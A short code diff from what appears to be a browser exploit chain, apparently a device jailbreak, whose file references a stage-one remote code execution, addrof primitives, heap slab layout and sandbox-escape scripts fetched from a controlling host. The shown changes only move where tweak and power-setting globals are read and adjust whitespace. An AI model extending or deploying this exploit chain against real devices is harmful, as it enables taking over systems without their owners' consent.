@@ -39,9 +39,9 @@ function print(x, reportError = false, dumphex = false) {
     xhr.open("GET", host + "/log.html?" + req , false);
     xhr.send(null);
 }
-  function getJS(fname,method = 'POST')
+  function getJS(fname,method = 'POST') 
   {
-      try
+      try 
       {
           let url = "";
           url = host + (fname.startsWith('/') ? fname : '/' + fname);
@@ -10177,15 +10177,6 @@ async function main() {
           }
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
-          // Tweak/level selection arrives in the setup_fcall postMessage
-          // payload (sent from rce_loader's sign_pointers handler). We are
-          // now well past setup_stage2_prim, so the globalThis property
-          // writes are safe here: the slab layout no longer matters and
-          // sbx1_main.js's spawn_pe() will read these globals a moment
-          // later when this worker evals sbx0 -> sbx1.
-          try { globalThis.__ls_tweaks = (typeof data.ls_tweaks === 'string' && data.ls_tweaks.length > 0) ? data.ls_tweaks : 'fiveicon'; } catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
-          try { globalThis.__powercuff_level = (typeof data.ls_powercuff_level === 'string' && data.ls_powercuff_level.length > 0) ? data.ls_powercuff_level : 'heavy'; } catch (e) { globalThis.__powercuff_level = 'heavy'; }
-          log("[setup_fcall] tweaks=" + globalThis.__ls_tweaks + " level=" + globalThis.__powercuff_level);
           try {
                 const sbx0_script = getJS('/sbx0_main_18.4.js?' + Date.now());
                 log("after get js");
@@ -10209,7 +10200,9 @@ async function main() {
         {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
-            print("inside stage1_rce from worker");
+            try { globalThis.__ls_tweaks = (typeof data.ls_tweaks === 'string' && data.ls_tweaks.length > 0) ? data.ls_tweaks : 'fiveicon'; } catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
+            try { globalThis.__powercuff_level = (typeof data.ls_powercuff_level === 'string' && data.ls_powercuff_level.length > 0) ? data.ls_powercuff_level : 'heavy'; } catch (e) { globalThis.__powercuff_level = 'heavy'; }
+            print("inside stage1_rce from worker, tweaks=" + globalThis.__ls_tweaks + " level=" + globalThis.__powercuff_level);
             main().then(async (p_temp) => {
               if(!p_temp.addrof)
               {
